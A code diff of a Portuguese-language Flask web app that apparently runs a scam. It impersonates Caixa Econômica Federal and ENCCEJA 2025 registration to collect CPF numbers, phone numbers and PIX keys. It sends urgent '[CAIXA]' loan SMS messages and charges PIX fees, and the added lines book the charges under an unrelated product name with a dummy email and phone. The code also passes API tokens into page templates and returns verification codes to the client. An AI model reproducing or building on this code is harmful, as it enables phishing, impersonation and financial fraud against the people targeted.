-                import urllib.parse
-                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
-                thank_you_url += '?' + query_string
-            
-            app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
-            
-            # Enviar SMS apenas se o número de telefone estiver disponível
-            if phone:
-                app.logger.info(f"[PROD] Preparando envio de SMS para {phone}")
-                
-                # Fazer várias tentativas de envio direto usando SMSDEV
-                max_attempts = 3
-                attempt = 0
-                sms_sent = False
-                
-                while attempt < max_attempts and not sms_sent:
-                    attempt += 1
-                    try:
-                        app.logger.info(f"[PROD] Tentativa {attempt} de envio de SMS via SMSDEV diretamente")
-                        
-                        # Formatar o nome para exibição
-                        nome_formatado = nome.split()[0] if nome else "Cliente"
-                        
-                        # Mensagem personalizada com link para thank_you_url
-                        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
-                        
-                        # Chamar diretamente a função SMSDEV
-                        sms_sent = send_sms_smsdev(phone, message)
-                        
-                        if sms_sent:
-                            app.logger.info(f"[PROD] SMS enviado com sucesso na tentativa {attempt} diretamente via SMSDEV")
-                            break
-                        else:
-                            app.logger.warning(f"[PROD] Falha ao enviar SMS diretamente na tentativa {attempt}/{max_attempts}")
-                            time.sleep(1.5)  # Intervalo maior entre tentativas
-                    except Exception as e:
-                        app.logger.error(f"[PROD] Erro na tentativa {attempt} de envio direto via SMSDEV: {str(e)}")
-                        time.sleep(1.0)
-                
-                # Tente a função especializada como backup se as tentativas diretas falharem
-                if not sms_sent:
-                    app.logger.warning(f"[PROD] Tentativas diretas falharam, usando função de confirmação de pagamento")
-                    sms_sent = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
-                
-                if sms_sent:
-                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
-                else:
-                    app.logger.error(f"[PROD] Todas as tentativas de envio de SMS falharam para {phone}")
-        else:
-            app.logger.info(f"[PROD] Pagamento {transaction_id} ainda não aprovado. Status: {status_data.get('status')}")
-        
-        # Adicionar informações extras ao status para o frontend
-        status_data['phone_provided'] = bool(phone)
-        # Como thank_you_url é sempre definido agora, podemos simplificar a lógica
-        if is_completed or is_approved:
-            status_data['thank_you_url'] = thank_you_url
-        else:
-            status_data['thank_you_url'] = None
-        
-        return jsonify(status_data)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/verificar-cpf')
-@app.route('/verificar-cpf/<cpf>')
-def verificar_cpf(cpf=None):
-    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
-    if cpf:
-        # Remover qualquer formatação do CPF se houver (pontos e traços)
-        cpf_limpo = re.sub(r'[^\d]', '', cpf)
-        app.logger.info(f"[PROD] CPF fornecido via URL: {cpf_limpo}")
-        return render_template('verificar-cpf.html', cpf_preenchido=cpf_limpo)
-    return render_template('verificar-cpf.html')
-
-@app.route('/api/create-discount-payment', methods=['POST'])
-def create_discount_payment():
-    try:
-        # Obter os dados do usuário da requisição
-        payment_data = request.get_json()
-        
-        if not payment_data:
-            app.logger.error("[PROD] Dados de pagamento não fornecidos")
-            return jsonify({"error": "Dados de pagamento não fornecidos"}), 400
-        
-        # Criar uma instância da API de pagamento com desconto
-        from pagamentocomdesconto import create_payment_with_discount_api
-        payment_api = create_payment_with_discount_api()
-        
-        # Criar o pagamento PIX com desconto
-        app.logger.info(f"[PROD] Criando pagamento PIX com desconto para CPF: {payment_data.get('cpf', 'N/A')}")
-        result = payment_api.create_pix_payment_with_discount(payment_data)
-        
-        if "error" in result:
-            app.logger.error(f"[PROD] Erro ao criar pagamento PIX com desconto: {result['error']}")
-            return jsonify(result), 500
-        
-        app.logger.info("[PROD] Pagamento PIX com desconto criado com sucesso")
-        return jsonify(result)
-    
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao criar pagamento com desconto: {str(e)}")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/api/check-payment-status')
-def check_discount_payment_status():
-    try:
-        payment_id = request.args.get('id')
-        
-        if not payment_id:
-            app.logger.error("[PROD] ID de pagamento não fornecido")
-            return jsonify({"error": "ID de pagamento não fornecido"}), 400
-        
-        # Criar uma instância da API de pagamento com desconto
-        from pagamentocomdesconto import create_payment_with_discount_api
-        payment_api = create_payment_with_discount_api()
-        
-        # Verificar o status do pagamento
-        app.logger.info(f"[PROD] Verificando status do pagamento com desconto: {payment_id}")
-        result = payment_api.check_payment_status(payment_id)
-        
-        if "error" in result:
-            app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {result['error']}")
-            return jsonify(result), 500
-        
-        app.logger.info(f"[PROD] Status do pagamento verificado: {result.get('status', 'N/A')}")
-        return jsonify(result)
-    
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/buscar-cpf')
-@check_referer
-def buscar_cpf():
-    try:
-        verification_token = os.environ.get('VERIFICATION_TOKEN')
-        if not verification_token:
-            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
-            return jsonify({'error': 'Configuration error'}), 500
-            
-        exato_api_token = os.environ.get('EXATO_API_TOKEN')
-        if not exato_api_token:
-            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
-            return jsonify({'error': 'API Token configuration error'}), 500
-
-        app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
-        return render_template('buscar-cpf.html', verification_token=verification_token, exato_api_token=exato_api_token)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao acessar busca de CPF: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/input-cpf')
-@check_referer
-def input_cpf():
-    try:
-        verification_token = os.environ.get('VERIFICATION_TOKEN')
-        if not verification_token:
-            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
-            return jsonify({'error': 'Configuration error'}), 500
-
-        app.logger.info("[PROD] Acessando página de entrada de CPF: input_cpf.html")
-        return render_template('input_cpf.html', verification_token=verification_token)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao acessar entrada de CPF: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/analisar-cpf')
-@check_referer
-def analisar_cpf():
-    try:
-        app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
-        exato_api_token = os.environ.get('EXATO_API_TOKEN')
-        if not exato_api_token:
-            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
-            return jsonify({'error': 'API Token configuration error'}), 500
-        
-        return render_template('analisar_cpf.html', exato_api_token=exato_api_token)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao acessar análise de CPF: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/opcoes-emprestimo')
-@check_referer
-def opcoes_emprestimo():
-    try:
-        # Get query parameters
-        cpf = request.args.get('cpf')
-        nome = request.args.get('nome')
-        
-        if not cpf or not nome:
-            app.logger.error("[PROD] CPF ou nome não fornecidos")
-            return redirect('/input-cpf')
-            
-        app.logger.info(f"[PROD] Acessando página de opções de empréstimo para CPF: {cpf}")
-        return render_template('opcoes_emprestimo.html')
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao acessar opções de empréstimo: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/aviso')
-@check_referer
-def seguro_prestamista():
-    try:
-        # Get customer data from query parameters
-        customer = {
-            'nome': request.args.get('nome', ''),
-            'cpf': request.args.get('cpf', ''),
-            'phone': request.args.get('phone', ''),
-            'pix_key': request.args.get('pix_key', ''),
-            'bank': request.args.get('bank', ''),
-            'amount': request.args.get('amount', '0'),
-            'term': request.args.get('term', '0')
-        }
-        
-        app.logger.info(f"[PROD] Renderizando página de aviso sobre seguro prestamista: {customer}")
-        return render_template('aviso.html', customer=customer)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro na página de aviso: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/obrigado')
-def thank_you():
-    try:
-        # Get customer data from query parameters if available
-        customer = {
-            'name': request.args.get('nome', ''),
-            'cpf': request.args.get('cpf', ''),
-            'phone': request.args.get('phone', ''),
-            'bank': request.args.get('bank', 'Caixa Econômica Federal'),
-            'pix_key': request.args.get('pix_key', ''),
-            'loan_amount': request.args.get('loan_amount', '4000')
-        }
-        
-        app.logger.info(f"[PROD] Renderizando página de agradecimento com dados: {customer}")
-        meta_pixel_id = os.environ.get('META_PIXEL_ID')
-        return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-        
-@app.route('/create-pix-payment', methods=['POST'])
-@check_referer
-def create_pix_payment():
-    try:
-        # Validar dados da requisição
-        if not request.is_json:
-            app.logger.error("[PROD] Requisição inválida: conteúdo não é JSON")
-            return jsonify({'error': 'Requisição inválida: formato JSON esperado'}), 400
-            
-        data = request.json
-        
-        # Verificar campos obrigatórios
-        required_fields = ['name', 'cpf', 'amount']
-        for field in required_fields:
-            if field not in data or not data[field]:
-                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
-                return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
-                
-        # Se o telefone estiver presente na requisição, garantir que esteja formatado corretamente
-        if 'phone' in data and data['phone']:
-            # Limpar caracteres não numéricos do telefone
-            data['phone'] = ''.join(filter(str.isdigit, data['phone']))
-            app.logger.info(f"[PROD] Telefone fornecido na requisição JSON: {data['phone']}")
-        
-        app.logger.info(f"[PROD] Iniciando criação de pagamento PIX: {data}")
-        
-        # Usar especificamente a API FOR4 para pagamentos da taxa regional
-        from for4payments import create_payment_api as create_for4_api
-        
-        try:
-            # Usar FOR4 API para pagamento da taxa regional
-            api = create_for4_api()
-            app.logger.info("[PROD] API FOR4 de pagamento inicializada com sucesso")
-        except ValueError as e:
-            app.logger.error(f"[PROD] Erro ao inicializar API FOR4 de pagamento: {str(e)}")
-            return jsonify({'error': 'Serviço de pagamento indisponível no momento. Tente novamente mais tarde.'}), 500
-        
-        # Criar o pagamento PIX
-        try:
-            # Gerar email automaticamente se não fornecido
-            if not data.get('email'):
-                data['email'] = generate_random_email(data['name'])
-            
-            # Padronizar os nomes dos campos para corresponder ao esperado pela API FOR4
-            payment_data = {
-                'name': data.get('name'),
-                'email': data.get('email'),
-                'cpf': data.get('cpf'),
-                'phone': data.get('phone', ''),
-                'amount': data.get('amount')
-            }
-            
-            payment_result = api.create_pix_payment(payment_data)
-            app.logger.info(f"[PROD] Pagamento PIX criado com sucesso via FOR4: {payment_result}")
-            
-            # Construir resposta com suporte a ambos formatos (NovaEra e For4Payments)
-            response = {
-                'transaction_id': payment_result.get('id'),
-                'pix_code': payment_result.get('pix_code') or payment_result.get('pixCode'),
-                'pix_qr_code': payment_result.get('pix_qr_code') or payment_result.get('pixQrCode'),
-                'status': payment_result.get('status', 'pending')
-            }
-            
-            return jsonify(response)
-            
-        except ValueError as e:
-            app.logger.error(f"[PROD] Erro ao criar pagamento PIX: {str(e)}")
-            return jsonify({'error': str(e)}), 400
-        except Exception as e:
-            app.logger.error(f"[PROD] Erro inesperado ao criar pagamento PIX: {str(e)}")
-            return jsonify({'error': 'Erro ao processar pagamento. Tente novamente mais tarde.'}), 500
-            
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro geral ao processar requisição: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-        
-@app.route('/verificar-pagamento', methods=['POST'])
-@check_referer
-def verificar_pagamento():
-    try:
-        data = request.get_json()
-        transaction_id = data.get('transactionId')
-        
-        if not transaction_id:
-            app.logger.error("[PROD] ID da transação não fornecido")
-            return jsonify({'error': 'ID da transação é obrigatório', 'status': 'error'}), 400
-            
-        app.logger.info(f"[PROD] Verificando status do pagamento WitePay: {transaction_id}")
-        
-        # Check if it's a WitePay transaction (starts with 'ch_')
-        if transaction_id.startswith('ch_'):
-            app.logger.info(f"[WITEPAY] Verificando status para: {transaction_id}")
-            
-            # Check if we have a postback status stored in session
-            session_key = f'payment_status_{transaction_id}'
-            app.logger.debug(f"[WITEPAY] Procurando chave de sessão: {session_key}")
-            app.logger.debug(f"[WITEPAY] Chaves disponíveis na sessão: {list(session.keys())}")
-            
-            # Check both session and in-memory store
-            payment_data = None
-            if session_key in session:
-                payment_data = session[session_key]
-                app.logger.info(f"[WITEPAY] Dados encontrados na sessão: {payment_data}")
-            elif transaction_id in payment_status_store:
-                payment_data = payment_status_store[transaction_id]
-                app.logger.info(f"[WITEPAY] Dados encontrados no store: {payment_data}")
-            
-            if payment_data:
-                status = payment_data.get('status', 'pending')
-                
-                if status == 'paid':
-                    app.logger.info(f"[WITEPAY] Pagamento confirmado via postback: {transaction_id}")
-                    
-                    # Trigger Google UTMFY pixel conversion event
-                    status_result = {
-                        'status': 'completed',
-                        'message': 'Pagamento confirmado!',
-                        'charge_id': payment_data.get('charge_id'),
-                        'order_id': payment_data.get('order_id'),
-                        'transaction_id': payment_data.get('transaction_id'),
-                        'amount': payment_data.get('amount'),
-                        'confirmed_at': payment_data.get('confirmed_at'),
-                        'utmfy_conversion': True  # Flag to trigger UTMFY pixel
-                    }
-                elif status == 'failed':
-                    app.logger.info(f"[WITEPAY] Pagamento falhado via postback: {transaction_id}")
-                    status_result = {
-                        'status': 'failed',
-                        'message': f"Pagamento não processado: {payment_data.get('reason', 'Motivo não especificado')}",
-                        'charge_id': payment_data.get('charge_id')
-                    }
-                else:
-                    # Still pending
-                    status_result = {
-                        'status': 'pending',
-                        'message': 'Aguardando confirmação do pagamento',
-                        'charge_id': payment_data.get('charge_id')
-                    }
-            else:
-                # No postback received yet, still pending
-                status_result = {
-                    'status': 'pending',
-                    'message': 'Aguardando confirmação do pagamento'
+        order_data = {
+            "amount": int(amount * 100),  # WitePay expects amount in cents
+            "currency": "BRL",
+            "customer": {
+                "name": user_data.get('nome', 'Usuário'),
+                "email": "gerarpagamentos@gmail.com",
+                "phone": "(11) 98779-0088",
+                "document": user_data.get('cpf', ''),
+            },
+            "products": [
+                {
+                    "name": "Receita do Amor",
+                    "value": int(amount * 100),
+                    "quantity": 1
                 }
-        else:
-            # Usar a API FOR4 para outros tipos de transação
-            from for4payments import create_payment_api as create_for4_api
-            api = create_for4_api()
-            status_result = api.check_payment_status(transaction_id)
-            app.logger.info(f"[PROD] Status do pagamento FOR4: {status_result}")
-            
-            # Se o pagamento foi confirmado, registrar evento do Facebook Pixel
-            if (status_result.get('status') == 'completed' or 
-                status_result.get('status') == 'paid' or
-                status_result.get('status') == 'PAID' or 
-                status_result.get('status') == 'COMPLETED' or 
-                status_result.get('status') == 'APPROVED' or
-                status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
-                app.logger.info(f"[PROD] Pagamento confirmado, ID da transação: {transaction_id}")
-                app.logger.info(f"[FACEBOOK_PIXEL] Registrando evento de conversão para os pixels: 1418766538994503, 1345433039826605 e 1390026985502891")
-                
-                # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
-                status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605', '1390026985502891']
-        
-        return jsonify(status_result)
-    
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
-        return jsonify({'error': f'Erro ao verificar status: {str(e)}', 'status': 'pending'}), 200
-
-@app.route('/witepay-postback', methods=['POST'])
-def witepay_postback():
-    """
-    WitePay postback endpoint to receive payment status updates
-    This endpoint validates payment status and triggers Google UTMFY pixel events
-    """
-    try:
-        data = request.get_json()
-        app.logger.info(f"[WITEPAY_POSTBACK] Received data: {data}")
-        
-        # Extract payment information from WitePay postback
-        charge_id = data.get('chargeId')
-        order_id = data.get('orderId')
-        status = data.get('status')
-        transaction_id = data.get('transactionId')
-        amount = data.get('amount')
-        
-        if not charge_id:
-            app.logger.error("[WITEPAY_POSTBACK] Missing chargeId in postback")
-            return jsonify({'error': 'chargeId is required'}), 400
-        
-        app.logger.info(f"[WITEPAY_POSTBACK] Processing payment update - Charge: {charge_id}, Status: {status}")
-        
-        # Process payment status
-        if status in ['PAID', 'COMPLETED', 'APPROVED']:
-            app.logger.info(f"[WITEPAY_POSTBACK] Payment confirmed for charge: {charge_id}")
-            
-            # Store payment confirmation for frontend polling
-            # Using both session and in-memory store for reliability
-            payment_data = {
-                'status': 'paid',
-                'charge_id': charge_id,
-                'order_id': order_id,
-                'transaction_id': transaction_id,
-                'amount': amount,
-                'confirmed_at': datetime.now().isoformat()
-            }
-            session[f'payment_status_{charge_id}'] = payment_data
-            payment_status_store[charge_id] = payment_data
-            
-            # Log for Google UTMFY pixel tracking
-            app.logger.info(f"[UTMFY_GOOGLE_PIXEL] Payment conversion - Charge: {charge_id}, Amount: {amount}")
-            
-        elif status in ['PENDING', 'PROCESSING']:
-            app.logger.info(f"[WITEPAY_POSTBACK] Payment pending for charge: {charge_id}")
-            payment_data = {
-                'status': 'pending',
-                'charge_id': charge_id,
-                'order_id': order_id
-            }
-            session[f'payment_status_{charge_id}'] = payment_data
-            payment_status_store[charge_id] = payment_data
-            
-        elif status in ['CANCELLED', 'FAILED', 'EXPIRED']:
-            app.logger.info(f"[WITEPAY_POSTBACK] Payment failed/cancelled for charge: {charge_id}")
-            payment_data = {
-                'status': 'failed',
-                'charge_id': charge_id,
-                'order_id': order_id,
-                'reason': status
-            }
-            session[f'payment_status_{charge_id}'] = payment_data
-            payment_status_store[charge_id] = payment_data
-        
-        return jsonify({'success': True, 'message': 'Postback processed successfully'}), 200
-        
-    except Exception as e:
-        app.logger.error(f"[WITEPAY_POSTBACK] Error processing postback: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
-
-@app.route('/check-for4payments-status', methods=['GET', 'POST'])
-@check_referer
-def check_for4payments_status():
-    try:
-        transaction_id = request.args.get('transaction_id')
-        
-        if not transaction_id:
-            # Verificar se foi enviado no corpo da requisição (compatibilidade)
-            data = request.get_json(silent=True)
-            if data and data.get('id'):
-                transaction_id = data.get('id')
-            else:
-                app.logger.error("[PROD] ID da transação não fornecido")
-                return jsonify({'error': 'ID da transação é obrigatório'}), 400
-            
-        app.logger.info(f"[PROD] Verificando status do pagamento FOR4: {transaction_id}")
-        
-        # Usar especificamente a API FOR4 para verificação de status
-        try:
-            from for4payments import create_payment_api as create_for4_api
-            api = create_for4_api()
-            app.logger.info("[PROD] API FOR4 inicializada com sucesso para verificação de status")
-        except ValueError as e:
-            app.logger.error(f"[PROD] Erro ao inicializar API FOR4: {str(e)}")
-            return jsonify({'error': 'Serviço de pagamento indisponível no momento.'}), 500
-        
-        # Verificar status do pagamento
-        status_result = api.check_payment_status(transaction_id)
-        app.logger.info(f"[PROD] Status do pagamento FOR4: {status_result}")
-        
-        # Verificar se o pagamento foi aprovado
-        # Compatibilidade com NovaEra ('paid', 'completed') e For4Payments ('APPROVED', 'PAID', 'COMPLETED')
-        if (status_result.get('status') == 'completed' or 
-            status_result.get('status') == 'paid' or
-            status_result.get('status') == 'PAID' or 
-            status_result.get('status') == 'COMPLETED' or 
-            status_result.get('status') == 'APPROVED' or
-            status_result.get('original_status') in ['APPROVED', 'PAID', 'COMPLETED']):
-            # Obter informações do usuário dos parâmetros da URL ou da sessão
-            nome = request.args.get('nome', '')
-            cpf = request.args.get('cpf', '')
-            phone = request.args.get('phone', '')
-            
-            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
-            
-            # Construir o URL personalizado para a página de agradecimento
-            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
-            
-            # Obter dados adicionais (banco, chave PIX e valor do empréstimo)
-            bank = request.args.get('bank', 'Caixa Econômica Federal')
-            pix_key = request.args.get('pix_key', cpf if cpf else '')
-            loan_amount = request.args.get('loan_amount', '4000')
-            
-            # Adicionar parâmetros do usuário, se disponíveis
-            params = {
-                'nome': nome if nome else '',
-                'cpf': cpf if cpf else '',
-                'phone': phone if phone else '',
-                'bank': bank,
-                'pix_key': pix_key,
-                'loan_amount': loan_amount,
-                'utm_source': 'smsempresa',
-                'utm_medium': 'sms',
-                'utm_campaign': '',
-                'utm_content': phone if phone else ''
-            }
-                
-            # Construir a URL completa com parâmetros codificados corretamente
-            if params:
-                # Usar urllib para codificar os parâmetros corretamente
-                import urllib.parse
-                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
-                thank_you_url += '?' + query_string
-            
-            # Enviar SMS apenas se o número de telefone estiver disponível
-            if phone:
-                # Usando a função especializada para enviar SMS de confirmação de pagamento
-                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
-                if success:
-                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
-                else:
-                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
-        
-        return jsonify(status_result)
-        
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
-        return jsonify({'status': 'pending', 'error': str(e)})
-
-@app.route('/send-verification-code', methods=['POST'])
-@check_referer
-def send_verification_code_route():
-    try:
-        data = request.json
-        phone_number = data.get('phone')
-
-        if not phone_number:
-            return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400
-
-        success, result = send_verification_code(phone_number)
-
-        if success:
-            # Store the verification code temporarily (in a real app, this should use Redis or similar)
-            # For demo purposes, we'll just return it directly (not ideal for security)
-            return jsonify({
-                'success': True, 
-                'message': 'Código enviado com sucesso',
-                'verification_code': result  # In a real app, don't send this back to client
-            })
-        else:
-            return jsonify({'success': False, 'message': result}), 400
-
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao enviar código de verificação: {str(e)}")
-        return jsonify({'success': False, 'message': 'Erro ao enviar código de verificação'}), 500
-
-@app.route('/atualizar-cadastro', methods=['POST'])
-def atualizar_cadastro():
-    try:
-        app.logger.info("[PROD] Recebendo atualização cadastral")
-        # Log form data for debugging
-        app.logger.debug(f"Form data: {request.form}")
-
-        # Extract form data
-        data = {
-            'birth_date': request.form.get('birth_date'),
-            'cep': request.form.get('cep'),
-            'employed': request.form.get('employed'),
-            'salary': request.form.get('salary'),
-            'household_members': request.form.get('household_members')
-        }
-
-        app.logger.info(f"[PROD] Dados recebidos: {data}")
-
-        # Aqui você pode adicionar a lógica para processar os dados
-        # Por enquanto, vamos apenas redirecionar para a página de pagamento
-        nome = request.form.get('nome', '')
-        cpf = request.form.get('cpf', '')
-        phone = request.form.get('phone', '')  # Obter número de telefone do formulário
-
-        return redirect(url_for('payment_update', nome=nome, cpf=cpf, phone=phone))
-
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
-        return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500
-
-@app.route('/sms-config')
-def sms_config():
-    try:
-        # Check SMS API key status
-        smsdev_status = bool(os.environ.get('SMSDEV_API_KEY'))
-        owen_status = bool(os.environ.get('SMS_OWEN_TOKEN'))
-
-        # Get test result from session if available
-        test_result = session.pop('test_result', None)
-        test_success = session.pop('test_success', None)
-
-        return render_template('sms_config.html',
-                              current_api=SMS_API_CHOICE,
-                              smsdev_status=smsdev_status,
-                              owen_status=owen_status,
-                              test_result=test_result,
-                              test_success=test_success)
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao acessar configuração SMS: {str(e)}")
-        return jsonify({'error': 'Erro interno do servidor'}), 500
-
-@app.route('/update-sms-config', methods=['POST'])
-def update_sms_config():
-    try:
-        sms_api = request.form.get('sms_api', 'SMSDEV')
-
-        # In a real application, this would be saved to a database
-        # But for this demo, we'll use a global variable
-        global SMS_API_CHOICE
-        SMS_API_CHOICE = sms_api
-
-        app.logger.info(f"[PROD] API SMS atualizada para: {sms_api}")
-
-        # We would typically use Flask's flash() here, but for simplicity we'll use a session variable
-        session['test_result'] = f"Configuração atualizada para {sms_api}"
-        session['test_success'] = True
-
-        return redirect(url_for('sms_config'))
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao atualizar configuração SMS: {str(e)}")
-        session['test_result'] = f"Erro ao atualizar configuração: {str(e)}"
-        session['test_success'] = False
-        return redirect(url_for('sms_config'))
-
-@app.route('/send-test-sms', methods=['POST'])
-def send_test_sms():
-    try:
-        phone = request.form.get('phone', '')
-
-        if not phone:
-            session['test_result'] = "Por favor, forneça um número de telefone válido"
-            session['test_success'] = False
-            return redirect(url_for('sms_config'))
-
-        # Message template for test
-        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."
-
-        # Choose which API to use based on SMS_API_CHOICE
-        if SMS_API_CHOICE.upper() == 'OWEN':
-            success = send_sms_owen(phone, message)
-        else:  # Default to SMSDEV
-            success = send_sms_smsdev(phone, message)
-
-        if success:
-            session['test_result'] = f"SMS de teste enviado com sucesso para {phone}"
-            session['test_success'] = True
-        else:
-            session['test_result'] = f"Falha ao enviar SMS para {phone}. Verifique o número e tente novamente."
-            session['test_success'] = False
-
-        return redirect(url_for('sms_config'))
-    except Exception as e:
-        app.logger.error(f"[PROD] Erro ao enviar SMS de teste: {str(e)}")
-        session['test_result'] = f"Erro ao enviar SMS de teste: {str(e)}"
-        session['test_success'] = False
-        return redirect(url_for('sms_config'))
-
-@app.route('/encceja')
-def encceja():
-    """Página do Encceja 2025"""
-    return render_template('encceja.html')
-
-@app.route('/inscricao')
-def inscricao():
-    """Página de inscrição do Encceja 2025"""
-    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
-    return render_template('inscricao.html', user_data=user_data)
-
-@app.route('/validar-dados', methods=['GET', 'POST'])
-def validar_dados():
-    """Página de validação de dados do usuário"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
-        return redirect(url_for('inscricao'))
-    
-    if request.method == 'POST':
-        # Atualizar dados do usuário
-        user_data.update({
-            'telefone': request.form.get('telefone', ''),
-            'email': request.form.get('email', ''),
-            'endereco': request.form.get('endereco', ''),
-            'cidade': request.form.get('cidade', ''),
-            'estado': request.form.get('estado', '')
-        })
-        session['user_data'] = user_data
-        return redirect(url_for('endereco'))
-    
-    return render_template('validar_dados.html', user_data=user_data)
-
-@app.route('/endereco', methods=['GET', 'POST'])
-def endereco():
-    """Página de cadastro de endereço"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
-        return redirect(url_for('inscricao'))
-    
-    if request.method == 'POST':
-        # Atualizar dados do usuário com endereço
-        user_data.update({
-            'cep': request.form.get('cep', ''),
-            'logradouro': request.form.get('logradouro', ''),
-            'numero': request.form.get('numero', ''),
-            'complemento': request.form.get('complemento', ''),
-            'bairro': request.form.get('bairro', ''),
-            'cidade': request.form.get('cidade', ''),
-            'estado': request.form.get('estado', ''),
-            'telefone': request.form.get('telefone', ''),
-            'email': request.form.get('email', '')
-        })
-        session['user_data'] = user_data
-        return redirect(url_for('local_prova'))
-    
-    return render_template('endereco.html', user_data=user_data)
-
-@app.route('/local-prova', methods=['GET', 'POST'])
-def local_prova():
-    """Página de seleção do local de prova"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
-        return redirect(url_for('inscricao'))
-    
-    if request.method == 'POST':
-        # Atualizar dados do usuário com local de prova
-        user_data.update({
-            'local_prova': request.form.get('local_prova', ''),
-            'cidade_prova': request.form.get('cidade_prova', ''),
-            'estado_prova': request.form.get('estado_prova', '')
-        })
-        session['user_data'] = user_data
-        return redirect(url_for('pagamento'))
-    
-    return render_template('local_prova.html', user_data=user_data)
-
-@app.route('/inscricao-sucesso')
-def inscricao_sucesso():
-    """Página de sucesso da inscrição"""
-    user_data = session.get('user_data', {})
-    return render_template('inscricao_sucesso.html', user_data=user_data)
-
-@app.route('/encceja-info')
-def encceja_info():
-    """Página com informações detalhadas sobre o Encceja - redireciona para pagamento"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
-        return redirect(url_for('inscricao'))
-    
-    return render_template('encceja_info.html', user_data=user_data)
-
-@app.route('/pagamento')
-def pagamento():
-    """Página de pagamento PIX"""
-    user_data = session.get('user_data', {})
-    
-    if not user_data.get('cpf'):
-        return redirect(url_for('inscricao'))
-    
-    return render_template('pagamento.html', user_data=user_data)
-
-@app.route('/criar-pagamento-pix', methods=['POST'])
-def criar_pagamento_pix():
-    """Criar pagamento PIX via WitePay - Sistema original Replit restaurado"""
-    try:
-        # Valor fixo do ENCCEJA
-        amount = 93.40
-        description = "Inscrição ENCCEJA 2025"
-        
-        app.logger.info(f"Iniciando criação de pagamento PIX - R$ {amount:.2f}")
-        
-        # Usar WitePay Gateway integrado
-        app.logger.info("Usando WitePay Gateway integrado")
-        
-        # Dados do usuário da sessão
-        user_data = session.get('user_data', {})
-        
-        # Preparar dados do cliente para WitePay
-        client_data = {
-            'clientName': user_data.get('nome', 'Cliente ENCCEJA'),
-            'clientDocument': user_data.get('cpf', '12345678901').replace('.', '').replace('-', ''),
-            'clientEmail': 'gerarpagamentos@gmail.com',
-            'clientPhone': '11987790088'
+            ]
         }
         
-        # Dados do produto
-        product_data = {
-            'name': 'Receita do Amor',
-            'value': int(amount * 100)  # R$ 93.40 em centavos
-        }
+        app.logger.info(f"Criando order WitePay: {order_data}")
+        order_response = requests.post(order_url, json=order_data, headers=order_headers, timeout=30)
         
-        # Usar o gateway WitePay já inicializado
-        from witepay_gateway import WitePayGateway
-        witepay = WitePayGateway()
+        if order_response.status_code != 200:
+            app.logger.error(f"Erro ao criar order WitePay: {order_response.status_code} - {order_response.text}")
